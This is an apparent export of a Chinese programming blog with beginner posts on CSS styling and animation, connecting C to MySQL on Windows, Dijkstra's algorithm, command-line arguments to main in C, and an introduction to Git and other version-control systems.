    <content><![CDATA[<h2 id="文本修饰类型CSS"><a href="#文本修饰类型CSS" class="headerlink" title="文本修饰类型CSS"></a>文本修饰类型CSS</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.class_test</span> &#123;</span><br><span class="line">    <span class="comment">/* 对齐方式 */</span></span><br><span class="line">	<span class="attribute">text-align</span>: left;</span><br><span class="line">	<span class="comment">/* 行高 */</span></span><br><span class="line">	<span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line">	<span class="comment">/* 字母间距 */</span></span><br><span class="line">	<span class="attribute">letter-spacing</span>: <span class="number">5px</span>;</span><br><span class="line">	<span class="comment">/* 单词间距 对中文无效*/</span></span><br><span class="line">	<span class="attribute">word-spacing</span>: <span class="number">30px</span>;</span><br><span class="line">	<span class="comment">/* 文本修饰 如加下划线等 */</span></span><br><span class="line">	<span class="attribute">text-decoration</span>: underline;</span><br><span class="line">	<span class="comment">/* 首行缩进 */</span></span><br><span class="line">	<span class="attribute">text-indent</span>: <span class="number">2em</span>;</span><br><span class="line">	<span class="comment">/* 文本大小写转换 capitalize是首字母自动大写 */</span></span><br><span class="line">	<span class="attribute">text-transform</span>: capitalize;</span><br><span class="line">	<span class="comment">/* 字体样式 */</span></span><br><span class="line">	<span class="attribute">font-family</span>: 微软雅黑;</span><br><span class="line">	<span class="comment">/* 字体大小 */</span></span><br><span class="line">	<span class="attribute">font-size</span>: <span class="number">5px</span>;</span><br><span class="line">	<span class="comment">/* 字体粗细 */</span></span><br><span class="line">	<span class="attribute">font-weight</span>: <span class="number">100px</span>;</span><br><span class="line">	<span class="comment">/* 字体阴影 */</span></span><br><span class="line">	<span class="comment">/* 按照顺序是水平方向的偏移，竖直方向的便宜，模糊程度（与值成正比）阴影颜色 */</span></span><br><span class="line">	<span class="attribute">text-shadow</span>: <span class="number">5px</span> <span class="number">100px</span> <span class="number">5px</span> blueviolet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="CSS动画"><a href="#CSS动画" class="headerlink" title="CSS动画"></a>CSS动画</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">p</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">color</span>: blueviolet;</span><br><span class="line">        <span class="attribute">background-color</span>: black;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 鼠标经过的时候 */</span></span><br><span class="line">    <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">color</span>: blueviolet;</span><br><span class="line">        <span class="attribute">background-color</span>: brown;</span><br><span class="line">        <span class="comment">/* 触发动画延迟时间 */</span></span><br><span class="line">        <span class="attribute">transition-delay</span>: <span class="number">200ms</span>;</span><br><span class="line">        <span class="comment">/* 完成一次动画所需时间 */</span></span><br><span class="line">        <span class="attribute">transition-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* 虽然说上面的是一个通用的写法，但是以防万一还是尽可能多地覆盖各种内核 */</span></span><br><span class="line">        <span class="attribute">-webkit-transition-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* 选择要过渡的属性，默认是all */</span></span><br><span class="line">        <span class="attribute">transition-property</span>: height,background;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>如果想要更加复杂的动画，就要配合@keyframes来使用</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">p</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: black;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">        <span class="attribute">animation-name</span>: test_animation;</span><br><span class="line">        <span class="attribute">animation-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* 循环动画的次数 */</span></span><br><span class="line">        <span class="attribute">animation-iteration-count</span>: <span class="number">5</span>;</span><br><span class="line">        <span class="comment">/* 轮流反向播放动画 */</span></span><br><span class="line">        <span class="attribute">animation-direction</span>: alternate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@keyframes</span> test_animation &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* from相当于0% */</span></span><br><span class="line">        <span class="selector-tag">from</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 在这里输入0%到100%的有效值 */</span></span><br><span class="line">        50% &#123;</span><br><span class="line">            <span class="attribute">background-color</span>: blue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* to相当于100% */</span></span><br><span class="line">        <span class="selector-tag">to</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><ul>
<li>网页设计中常听的属性名：margin(外边距)、 border(边框)、 padding(内边距)、content(内容) ，CSS盒子模式都具备这些属性。</li>
<li>所有HTML元素可以看作盒子，在CSS中，”box model”这一术语是用来设计和布局时使用。 </li>
</ul>
<p>下面给出图解</p>
<img src="/2020/03/08/CSS-%E8%AF%AD%E6%B3%95%E4%BA%8C/box-model.png" class>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.class_test</span>&#123;</span><br><span class="line">        <span class="comment">/* 依次定义边框的粗细、样式、颜色 */</span></span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">        <span class="comment">/* 边框距离周围元素的上边距 */</span></span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="comment">/* 内容到边框的上边距 */</span></span><br><span class="line">        <span class="attribute">padding-top</span>: <span class="number">20px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>CSS基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows系统下C语言连接MySQL</title>
    <url>/2020/07/03/C%E8%AF%AD%E8%A8%80%E8%BF%9E%E6%8E%A5MySQL/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>高级语言连接数据库技术可谓十分成熟，但是使用C语言连接数据库还是挺少的，之前做数据库课程设计的时候刚好用到C语言连接数据库，因此就把这次过程记录下来。<a id="more"></a></p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
<li>MySQL 5.6.48-64位</li>
<li>MinGW64 <ul>
<li>==假如你安装的MySQL是32位的，那么MinGW就需要安装32位版本的==</li>
</ul>
</li>
</ol>
<ul>
<li>Visual Studio Code（其他编辑器也可以，有条件的可以用记事本）</li>
</ul>
<h2 id="开始搭建环境"><a href="#开始搭建环境" class="headerlink" title="开始搭建环境"></a>开始搭建环境</h2><ul>
<li><p>配置<code>MinGW64</code>环境:</p>
<ul>
<li><p><a href="http://mingw.org/" target="_blank" rel="noopener">官网下载</a>或者<a href="https://q.yalexin.top/MinGW64.zip" target="_blank" rel="noopener">点此下载</a></p>
</li>
<li><p>假如是从这里下载的，将压缩文件解压到自定义位置，记住该位置</p>
</li>
<li><p>依次点击“此电脑”，“属性”，“高级系统设置”，“环境变量”，在系统变量中找到<code>Path</code>，增加一条记录，记录值是<code>MinGW64</code>安装路径下的<code>bin</code>文件夹</p>
<p><img src="https://q.yalexin.top/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%9B%BE.png" alt></p>
</li>
<li><p>在终端输入<code>gcc</code>时假如输出下面的语句就说明配置好了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc: fatal error: no input files</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>项目中引入库文件</p>
<ul>
<li><p>所在项目处新建文件夹<code>lib</code>，在<code>MySQL</code>的安装目录下的<code>lib</code>文件夹下找到<code>libmysql.dll</code>文件（我的是在<code>C:\Program Files\MySQL\MySQL Server 5.6\lib</code>文件夹下），将该文件复制到刚刚新建的<code>lib</code>文件夹中</p>
</li>
<li><p>在程序中加入头文件：</p>
<ul>
<li><code>#include &lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</code>（该路径自己根据自己的情况进行相应更改）</li>
<li><code>#include &lt;winsock.h&gt;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>例如我有一个数据库<code>test</code>，我要访问的是<code>stu</code>表：</p>
<p>在项目位置新建<code>main.c</code>文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-07-03 14:17:45</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-07-03 14:53:58</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\DatabaseConnect\main.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOST <span class="meta-string">"localhost"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 3306</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DBNAME <span class="meta-string">"test"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLENAME <span class="meta-string">"stu"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERNAME <span class="meta-string">"root"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASW <span class="meta-string">"123456"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MYSQL mysql;</span><br><span class="line">    MYSQL_ROW row;</span><br><span class="line">    MYSQL_RES *res = (MYSQL_RES *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MYSQL_RES));</span><br><span class="line">    mysql_init(&amp;mysql);</span><br><span class="line">    <span class="keyword">if</span> (mysql_real_connect(&amp;mysql, HOST, USERNAME, PASW, DBNAME, PORT, <span class="literal">NULL</span>,</span><br><span class="line">                           CLIENT_FOUND_ROWS)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ok!\n"</span>);</span><br><span class="line">        <span class="keyword">char</span> sql[<span class="number">50</span>] = <span class="string">""</span>;</span><br><span class="line">        <span class="comment">// 告知此次是gbk</span></span><br><span class="line">        mysql_set_character_set(&amp;mysql, <span class="string">"gbk"</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(sql, <span class="string">"SELECT * FROM %s"</span>, TABLENAME);</span><br><span class="line">        <span class="keyword">if</span> (mysql_real_query(&amp;mysql, sql, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">strlen</span>(sql))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"查询失败,错误信息：%s"</span>, mysql_error(&amp;mysql));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res = mysql_store_result(&amp;mysql);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"|%-10s|%-10s|\n\n"</span>, <span class="string">"学号"</span>, <span class="string">"姓名"</span>);</span><br><span class="line">            <span class="keyword">while</span> ((row = mysql_fetch_row(res)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"|%-10s|%-10s|\n\n"</span>, row[<span class="number">0</span>], row[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_free_result(res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭连接，避免浪费资源</span></span><br><span class="line">        mysql_close(&amp;mysql);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"登录失败！错误原因：%s\n是否退出：0：是，其他：否。\n"</span>,</span><br><span class="line">               mysql_error(&amp;mysql));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用命令行进行编译，进入该项目位置，打开命令终端，输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Iinclude -Llib main.c -llibmysql -o main</span><br></pre></td></tr></table></figure>

<p>如果足够幸运的话就会产生<code>main.exe</code>文件，运行该文件，输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ok!</span><br><span class="line">|学号      |姓名      |</span><br><span class="line"></span><br><span class="line">|1         |张三      |</span><br><span class="line"></span><br><span class="line">|2         |李四      |</span><br><span class="line"></span><br><span class="line">|3         |王五      |</span><br></pre></td></tr></table></figure>

<h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><ol>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">error: unknown type name 'SOCKET'</span><br><span class="line"><span class="meta"> #</span><span class="bash">define my_socket SOCKET</span></span><br></pre></td></tr></table></figure>

<p>加入头文件的顺序中，<code>#include &lt;winsock.h&gt;</code>需要在<code>#include &lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</code>上面</p>
</li>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">File format not recognized collect2.exe: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure>

<p>不知道是不是因为安装的<code>MySQL</code>是64位，而编译器<code>MinGw</code>是32位造成的，我尝试用32位进行编译的时候会出现上面的错误，换了64位的就不会出现问题了。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstra算法求最短路</title>
    <url>/2020/10/19/Dijkstra%E7%AE%97%E6%B3%95%E6%B1%82%E6%9C%80%E7%9F%AD%E8%B7%AF/</url>
    <content><![CDATA[<p><code>Dijkstra</code>算法和<code>Prim</code>算法具有极其相似的地方，二者都是构建两个集合，利用贪心算法，将其中一个集合不断进行扩充，最终求得最优解。<a id="more"></a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x7ffffff</span></span><br><span class="line"><span class="keyword">int</span> adj[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> distance[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> minD[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">bool</span> visited[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> t, n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> u, minDistance;</span><br><span class="line">    minD[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    visited[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) minD[i] = adj[i][<span class="number">1</span>] != <span class="number">0</span> ? adj[i][<span class="number">1</span>] : INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        u = <span class="number">-1</span>, minDistance = INF;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[j] &amp;&amp; minDistance &gt; minD[j]) &#123;</span><br><span class="line">                u = j;</span><br><span class="line">                minDistance = minD[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[u] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="comment">// 如果 j 没有被访问过且 j 和 u 之间联通 并且 j 通过 u 可以缩短 j 到已被访问的点集之间的距离</span></span><br><span class="line">            <span class="keyword">if</span> (!visited[j] &amp;&amp; adj[j][u] != <span class="number">0</span> &amp;&amp;</span><br><span class="line">                minD[j] &gt; minDistance + adj[j][u]) &#123;</span><br><span class="line">                minD[j] = minDistance + adj[j][u];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">printf</span>(<span class="string">"%d "</span>, minD[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最短路</tag>
        <tag>C</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言向main函数传递参数</title>
    <url>/2020/04/02/C%E8%AF%AD%E8%A8%80%E5%90%91main%E5%87%BD%E6%95%B0%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<p>我们一般写C语言的代码的时候，<code>main</code>函数是不带形参的，如<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description: </span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 11:16:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 12:44:54</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是其实我们是可以向<code>main</code>函数传递参数的，只不过此时我们需要在命令行中进行编译运行，例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 11:16:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 12:52:16</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> arc, <span class="keyword">char</span>* input[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"您输入了%d个参数，分别是：\n"</span>, arc);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= arc; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在命令行中，进入到程序所在的文件夹下，输入编译命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./test 参数一 参数二 参数三</span><br></pre></td></tr></table></figure>

<p>输出的结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">您输入了4个参数，分别是：</span><br><span class="line">D:\my_c_workspace\some_test\test.exe</span><br><span class="line">参数一</span><br><span class="line">参数二</span><br><span class="line">参数三</span><br></pre></td></tr></table></figure>

<p>可以发现第一个参数实际上是命令本身（虽然说它的下标是0）！</p>
<p>我们可以借助上面的方法给<code>main</code>函数进行传递参数，接着进行类型转换就可以得到我们想要的数据类型。</p>
]]></content>
      <categories>
        <category>命令行</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之Git的初体验</title>
    <url>/2022/02/08/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E7%9A%84%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说实话，我之前虽然经常接触和使用<code>Git</code>，但是实际上也只是经常使用<code>Git</code>的<code>add 、commit、push</code>功能，其他的基本没怎么接触过，算是某种意义上的零基础。在团队协作的背景下，版本控制是一个简化队员合作、提高效率的绕不开的难题，因此我觉得十分有必要学一下<code>Git</code>工具，当然了这个工具很强大，很多内容往深了很难掌握，大多数人也一般用不到，因此这部分我打算不学，以后需要用得到了再去翻翻文档应该也还来得及。</p>
<a id="more"></a>

<h2 id="Git简介"><a href="#Git简介" class="headerlink" title="Git简介"></a>Git简介</h2><p>介绍Git之前，首先就要先明白什么叫<strong>版本控制</strong></p>
<blockquote>
<p>版本控制是指对软件开发过程中各种程序代码、配置文件及说明文档等文件变更的管理，是软件配置管理的核心思想之一。</p>
</blockquote>
<p>简而言之就是记录追踪文件的变更，包括何人何时修改了何文件，以及修改成了什么内容，并在适当的时候打上标记，方便以后回滚，经常玩游戏的朋友们一定对游戏里的存档，在游戏适当的时候存个档，在游戏中我们就可以方便在任意一个存档点切换。</p>
<p>当然了，版本控制的功能不仅仅局限于上面所说的内容，特别是面对多人协作开发时，版本控制软件还可以方便队员分工，记录队员完成的内容，方便代码合并。</p>
<p>现在市面上常见的版本控制软件有好几个，由于我并没有用过除了<code>Git</code>以外的工具，因此对下列其他的描述均来自<a href="https://www.jianshu.com/p/47f79a13524f" target="_blank" rel="noopener">简书博主</a></p>
<h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p><code>Git</code>是目前世界上使用最广泛的分布式版本控制系统，使用<code>Git</code>和<code>Gitlab</code>搭建版本控制环境是现在互联网公司最流行的版本控制方式，关于<code>Git</code>、<code>Github</code>、<code>Gitlab</code>的关系，可以理解成：</p>
<ul>
<li><code>Git</code>是一种版本控制系统，是一种工具，用于代码的存储和版本控制。 </li>
<li><code>GitHub</code>是一个基于Git实现的在线代码仓库，是目前全球最大的<strong>代码托管平台</strong>，可以帮助程序员之间互相交流和学习，即该平台可以作为我们存放代码的云端。 </li>
<li><code>GitLab</code>是一个基于<code>Git</code>实现的在线代码仓库软件，你可以用<code>GitLab</code>自己搭建一个类似于<code>GitHub</code>一样的仓库，但是<code>GitLab</code>有完善的管理界面和权限控制，一般用于在企业、学校等内部网络搭建<code>Git</code>私服。</li>
</ul>
<p><code>Git</code>的诞生，当年也有一些趣事，大家感兴趣可以去网上搜索一下，不得不赞叹一下 <strong>Linus Tovalds</strong> ，真大牛！</p>
<p><code>Github</code>地址：<a href="https://github.com/git/git" target="_blank" rel="noopener">https://github.com/git/git</a><br> 官方网站：<a href="https://git-scm.com" target="_blank" rel="noopener">https://git-scm.com/</a><br> 官方文档：<a href="https://git-scm.com/docs" target="_blank" rel="noopener">https://git-scm.com/docs</a><br> 中文文档：<a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2</a><br> 下载地址：<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a></p>
<h3 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h3><p><code>TortoiseSVN</code>是一款非常易于使用的跨平台的 版本控制/版本控制/源代码控制软件。它基于<a href="http://subversion.apache.org/" target="_blank" rel="noopener">Apache  Subversion（SVN）®</a> ; <code>TortoiseSVN</code>为<code>Subversion</code>提供了一个简单易用的用户界面。<br> TortoiseSVN开源地址：<a href="https://osdn.net/projects/tortoisesvn/" target="_blank" rel="noopener">https://osdn.net/projects/tortoisesvn/</a><br> Subversion的Github地址：<a href="https://github.com/apache/subversion" target="_blank" rel="noopener">https://github.com/apache/subversion</a><br> 官方网站：<a href="https://tortoisesvn.net/" target="_blank" rel="noopener">https://tortoisesvn.net/</a><br> 官方文档：<a href="https://tortoisesvn.net/docs/release/TortoiseSVN_en/index.html" target="_blank" rel="noopener">https://tortoisesvn.net/docs/release/TortoiseSVN_en/index.html</a><br> 中文文档：<a href="https://tortoisesvn.net/docs/release/TortoiseSVN_zh_CN/index.html" target="_blank" rel="noopener">https://tortoisesvn.net/docs/release/TortoiseSVN_zh_CN/index.html</a><br> 下载地址：<a href="https://tortoisesvn.net/downloads.html" target="_blank" rel="noopener">https://tortoisesvn.net/downloads.html</a></p>
<h3 id="Mercurial"><a href="#Mercurial" class="headerlink" title="Mercurial"></a><strong>Mercurial</strong></h3><p><code>Mercurial</code>是一个免费的分布式源代码管理工具。它可以有效地处理任何规模的项目，并提供简单直观的界面。<code>Mercurial</code> 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。<br> 官方网站：<a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">https://www.mercurial-scm.org/</a><br> 官方文档：<a href="https://www.mercurial-scm.org/wiki/BeginnersGuides" target="_blank" rel="noopener">https://www.mercurial-scm.org/wiki/BeginnersGuides</a><br> 下载地址：<a href="https://www.mercurial-scm.org/downloads" target="_blank" rel="noopener">https://www.mercurial-scm.org/downloads</a></p>
<h3 id="CVS"><a href="#CVS" class="headerlink" title="CVS"></a>CVS</h3><p><code>CVS</code>是版本控制系统，是源配置管理（<code>SCM</code>）的重要组成部分。使用它，您可以记录源文件和文档的历史记录。老牌的版本控制系统，它是基于客户端/服务器的行为使得其可容纳多用户，构成网络也很方便。这一特性使得<code>CVS</code>成为位于不同地点的人同时处理数据文件（特别是程序的源代码）时的首选。<br> 官方网站：<a href="http://www.nongnu.org/cvs/" target="_blank" rel="noopener">http://www.nongnu.org/cvs/</a><br> 官方文档：<a href="https://web.archive.org/web/20140629065005/http://ximbiot.com/cvs/manual/cvs-1.11.23/cvs.html" target="_blank" rel="noopener">https://web.archive.org/web/20140629065005/http://ximbiot.com/cvs/manual/cvs-1.11.23/cvs.html</a><br> 下载地址：<a href="https://ftp.gnu.org/non-gnu/cvs/" target="_blank" rel="noopener">https://ftp.gnu.org/non-gnu/cvs/</a></p>
<h2 id="Git的安装"><a href="#Git的安装" class="headerlink" title="Git的安装"></a>Git的安装</h2><p><code>Git</code>发展很快，由最初的只能在<code>Linux</code>和<code>Unix</code>，后来人们也把它移植到了其他平台，现在，<code>Git</code>可以在<code>Linux</code>、<code>Unix</code>、<code>Mac</code>和<code>Windows</code>这几大平台上正常运行了。 </p>
